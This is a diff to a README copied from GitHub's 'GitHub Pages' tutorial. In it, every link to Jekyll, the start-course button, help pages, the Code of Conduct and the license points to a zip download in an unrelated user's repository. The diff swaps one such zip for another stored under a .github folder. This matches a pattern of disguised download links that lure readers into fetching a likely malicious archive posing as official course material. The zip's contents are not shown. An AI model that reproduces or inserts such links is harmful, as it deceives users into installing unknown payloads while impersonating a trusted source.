@@ -25,8 +25,8 @@ With GitHub Pages, you can host project blogs, documentation, resumes, portfolio
 
 - **Who is this for**: Beginners, students, project maintainers, small businesses.
 - **What you'll learn**: How to build a GitHub Pages site.
-- **What you'll build**: We'll build a simple GitHub Pages site with a blog. We'll use [Jekyll](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip), a static site generator.
-- **Prerequisites**: If you need to learn about branches, commits, and pull requests, take [Introduction to GitHub](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip) first.
+- **What you'll build**: We'll build a simple GitHub Pages site with a blog. We'll use [Jekyll](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip), a static site generator.
+- **Prerequisites**: If you need to learn about branches, commits, and pull requests, take [Introduction to GitHub](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip) first.
 - **How long**: This course takes less than one hour to complete.
 
 In this course, you will:
@@ -40,7 +40,7 @@ In this course, you will:
 ### How to start this course
 
 <!-- For start course, run in JavaScript:
-'https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip' + new URLSearchParams({
+'https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip' + new URLSearchParams({
   template_owner: 'skills',
   template_name: 'github-pages',
   owner: '@me',
@@ -50,12 +50,12 @@ In this course, you will:
 }).toString()
 -->
 
-[![start-course](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip)](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip%40me&name=skills-github-pages&description=My+clone+repository&visibility=public)
+[![start-course](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip)](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip%40me&name=skills-github-pages&description=My+clone+repository&visibility=public)
 
 1. Right-click **Start course** and open the link in a new tab.
 2. In the new tab, most of the prompts will automatically fill in for you.
    - For owner, choose your personal account or an organization to host the repository.
-   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip).
+   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip).
    - Scroll down and click the **Create repository** button at the bottom of the form.
 3. After your new repository is created, wait about 20 seconds, then refresh the page. Follow the step-by-step instructions in the new repository's README.
 
@@ -68,8 +68,8 @@ In this course, you will:
 
 ---
 
-Get help: [Post in our discussion board](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip)
+Get help: [Post in our discussion board](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip) &bull; [Review the GitHub status page](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip)
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip) &bull; [MIT License](https://raw.githubusercontent.com/Amitdaskne/github-pages/main/caret/github-pages.zip)
+&copy; 2023 GitHub &bull; [Code of Conduct](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip) &bull; [MIT License](https://github.com/Amitdaskne/github-pages/raw/refs/heads/main/.github/pages-github-v3.2.zip)
 
 </footer>
